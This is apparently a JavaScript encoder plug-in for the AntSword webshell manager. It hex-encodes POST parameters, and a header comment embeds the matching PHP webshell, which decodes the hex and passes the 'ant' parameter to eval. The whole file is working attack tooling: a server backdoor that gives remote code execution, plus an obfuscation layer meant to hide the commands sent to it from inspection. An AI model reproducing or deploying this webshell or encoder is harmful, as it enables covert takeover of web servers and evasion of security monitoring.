/**

php::hex for 编码器, 把所有的POST参数都进行了 hex 编码
Create at: 2019/04/10 13:02:54

https://github.com/AntSwordProject/antSword/issues/185

========================================================

<?php
foreach($_POST as $k => $v){$_POST[$k]=pack("H*", $v);}
@eval($_POST['ant']);
?>

========================================================
*/
'use strict';

module.exports = (pwd, data) => {
  let ret = {};
  for (let _ in data) {
    if (_ === '_') { continue };
    ret[_] = Buffer.from(data[_]).toString('hex');
  }
  ret[pwd] = Buffer.from(data['_']).toString('hex');
  return ret;
}